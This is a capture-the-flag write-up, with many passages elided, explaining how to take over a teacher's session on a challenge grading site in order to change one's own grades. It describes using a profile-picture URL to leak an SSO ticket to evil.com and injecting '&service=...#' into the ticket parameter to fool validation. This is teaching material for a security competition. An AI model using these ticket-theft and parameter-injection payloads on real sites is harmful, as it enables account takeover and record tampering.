...
This challenge is all about attacking a webserver of some university and changing your own grades. A very relatable challenge. Let's start by exemining the system:
...
However, an interesting thing we should note for later is the fact that Chrome shows us some interesting JS files which are included to the site, and expose some api endpoints:
...
But we aren't provided with any credentials, and the regular attempts of common credentials, SQLi and so on don't work here.

### Getting Credentials

If we'd look at the source HTML of the SSO page we'll soon notice a peculiar comment: 
```html
...
Now that we are logged in, we are presented with a page to configure our user. 
...
Notice the option to `Request re-evaluation`, which makes a `POST` request to `/whine`. I assumed that it makes a teacher view your grade sheet. This tells us that the challenge probably includes some client side elements.

### Finding a CSRF

The request to `/whine` does make it seem like there's a client side vulnerability hiding somewhere. You might feel inclined to start looking at the profile configuration page, as image upload is always a good place to start in.
...
If you'd try to escape the attribute by injecting various characters you'd soon discover it's impossible. But because the picture field we control is included as the `src` of the image, it's possible to supply a regular HTTP URL instead of a [data URL](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs). We `POST` our changes to the configuration with the following data:
...
And whenever we or our teacher view our profile picture, it'l make a `GET` request to the URL we specified!
...
2. If we are already authenticated, `sso` returns a redirect to `http://grade.chal-kalmarc.tf/login&ticket=TGT-1234...`. Notice the inclusion of the ticket parameter to the URL.
...
One interesting part about it is that the SSO seems to be very general. That is, we can try to generate tickets for services other than `http://grade.chal-kalmarc.tf/`.
...
It might be implemented in a way resembling:
```python
...
And if that's the case (and it is the case), we might be able to inject params and modify the structure of the URL.
When submitting a ticket with the following value: `TGT&service=abc#`, the validation process will generate the following `GET` request:
```
GET /validate?ticket=TGT&service=abc#&service=http://grade.chal-kalmarc.tf/login
```
In that case, we were able to make `grade.chal-kalmarc.tf` validate a whole other service, as now the service being requested for validation is `abc`, and everything coming after the hash (#) is ignored.
...
1. Set the `picture` to a URL structured like this: `http://sso.chal-kalmarc.tf/login?service=http://evil.com`
2. The teacher will view the grades, making a `GET` request to the URL specified above.
...
5. We then request the following URL from our own machine, with the ticket we just got:  `http://grade.chal-kalmarc.tf/login?ticket=TGT-1234...%26service%3dhttp://evil.com%23`
...
Now the site as a teacher is pretty bugged, probably due to limitations of many participantes of the CTF using the same `grade.chal-kalmarc.tf` machine.
